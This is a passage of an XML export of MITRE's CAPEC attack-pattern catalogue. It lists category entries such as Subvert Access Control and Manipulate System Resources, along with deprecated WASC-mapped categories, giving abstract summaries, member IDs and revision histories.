               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Prerequisites, Description, Relationships, Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-01-09">Abuse of Functionality</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="223" Name="Employ Probabilistic Techniques" Status="Stable">
         <ns0:Summary>An attacker utilizes probabilistic techniques to explore and overcome security properties of the target that are based on an assumption of strength due to the extremely low mathematical probability that an attacker would be able to identify and exploit the very rare specific conditions under which those security properties do not hold.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="112" />
            <ns0:Has_Member CAPEC_ID="28" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-01-09">Probabilistic Techniques</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="225" Name="Subvert Access Control" Status="Stable">
         <ns0:Summary>An attacker actively targets exploitation of weaknesses, limitations and assumptions in the mechanisms a target utilizes to manage identity and authentication as well as manage access to its resources or authorize functionality. Such exploitation can lead to the complete subversion of any trust the target system may have in the identity of any entity with which it interacts, or the complete subversion of any control the target has over its data or functionality. Weaknesses targeted by subversion of authorization controls are often due to three primary factors: 1) a fundamental dependence on authentication mechanisms being effective; 2) a lack of effective control over the separation of privilege between various entities; and 3) assumptions and over confidence in the strength or rigor of the implemented authorization mechanisms.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="21" />
            <ns0:Has_Member CAPEC_ID="114" />
            <ns0:Has_Member CAPEC_ID="115" />
            <ns0:Has_Member CAPEC_ID="22" />
            <ns0:Has_Member CAPEC_ID="94" />
            <ns0:Has_Member CAPEC_ID="122" />
            <ns0:Has_Member CAPEC_ID="233" />
            <ns0:Has_Member CAPEC_ID="390" />
            <ns0:Has_Member CAPEC_ID="507" />
            <ns0:Has_Member CAPEC_ID="560" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-01-09">Exploitation of Authentication</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="232" Name="DEPRECATED: Exploitation of Authorization" Status="Deprecated">
         <ns0:Summary>This category has been deprecated as it is no longer used by any of the Views.</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-05-01">Exploitation of Authorization</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="255" Name="Manipulate Data Structures" Status="Stable">
         <ns0:Summary>Attack patterns in this category manipulate and exploit characteristics of system data structures in order to violate the intended usage and protections of these structures. This is done in such a way that yields either improper access to the associated system data or violations of the security properties of the system itself due to vulnerabilities in how the system processes and manages the data structures. Often, vulnerabilities and therefore exploitability of these data structures exist due to ambiguity and assumption in their design and prescribed handling.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="123" />
            <ns0:Has_Member CAPEC_ID="124" />
            <ns0:Has_Member CAPEC_ID="129" />
            <ns0:Has_Member CAPEC_ID="153" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="262" Name="Manipulate System Resources" Status="Stable">
         <ns0:Summary>Attack patterns within this category focus on the adversary's ability to manipulate one or more resources in order to achieve a desired outcome. This is a broad class of attacks wherein the attacker is able to change some aspect of a resource's state or availability and thereby affect system behavior or information integrity. Examples of resources include files, applications, libraries, infrastructure, and configuration information. Outcomes can range from vandalism and reduction in service to the execution of arbitrary code on the target machine.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="184" />
            <ns0:Has_Member CAPEC_ID="440" />
            <ns0:Has_Member CAPEC_ID="161" />
            <ns0:Has_Member CAPEC_ID="165" />
            <ns0:Has_Member CAPEC_ID="176" />
            <ns0:Has_Member CAPEC_ID="607" />
            <ns0:Has_Member CAPEC_ID="438" />
            <ns0:Has_Member CAPEC_ID="439" />
            <ns0:Has_Member CAPEC_ID="441" />
            <ns0:Has_Member CAPEC_ID="548" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-01-09">Manipulate Resources</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="281" Name="DEPRECATED: Analyze Target" Status="Deprecated">
         <ns0:Summary>This category has been deprecated as it is no longer used in any view.</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Other_Notes</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-05-01">Analyze Target</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="286" Name="DEPRECATED: Reconnaissance" Status="Deprecated">
         <ns0:Summary>This category has been deprecated as it is no longer used in any view.</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-05-01">Reconnaissance</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="334" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-01 - Insufficient Authentication" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Insufficient Authentication</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-275" Section="WASC-01 - Insufficient Authentication" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="335" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-02 - Insufficient Authorization" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Insufficient Authorization</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-276" Section="WASC-02 - Insufficient Authorization" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="336" Name="DEPRECATED: WASC-03 - Integer Overflows" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Integer Overflows</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-03 - Integer Overflows</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="337" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-04 - Insufficient Transport Layer Protection" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Insufficient Transport Layer Protection</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-278" Section="WASC-04 - Insufficient Transport Layer Protection" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="338" Name="DEPRECATED: WASC-05 - Remote File Inclusion" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Remote File Inclusion</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-05 - Remote File Inclusion</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="339" Name="DEPRECATED: WASC-06 - Format String" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Format String</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="67" />
         </ns0:Relationships>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-15" Section="WASC-06 - Format String" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-06 - Format String</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="340" Name="DEPRECATED: WASC-07 - Buffer Overflow" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Buffer Overflow</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-07 - Buffer Overflow</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="341" Name="DEPRECATED: WASC-08 - Cross-Site Scripting" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Cross-Site Scripting</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-08 - Cross-Site Scripting</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="342" Name="DEPRECATED: WASC-09 - Cross-Site Request Forgery" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Cross-Site Request Forgery</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-09 - Cross-Site Request Forgery</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="343" Name="DEPRECATED: WASC-10 - Denial of Service" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Denial of Service - see view 333</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships, Summary</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-10 - Denial of Service</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="344" Name="DEPRECATED: WASC-11 - Brute Force" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Brute Force</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-11 - Brute Force</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="345" Name="DEPRECATED: WASC-12 - Content Spoofing" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Content Spoofing</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-12-17">WASC-12 - Content Spoofing</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="346" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-13 - Information Leakage" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Information Leakage</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-288" Section="WASC-13 - Information Leakage" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="347" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-14 - Server Misconfiguration" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Server Misconfiguration</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-289" Section="WASC-14 - Server Misconfiguration" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="348" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-15 - Application Misconfiguration" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Application Misconfiguration</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-290" Section="WASC-15 - Application Misconfiguration" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="349" Name="DEPRECATED: WASC Threat Classification 2.0 - WASC-16 - Directory Indexing" Status="Deprecated">
         <ns0:Summary>This category is related to the WASC Threat Classification 2.0 item Directory Indexing</ns0:Summary>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-11" Section="WASC-16 - Directory Indexing" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
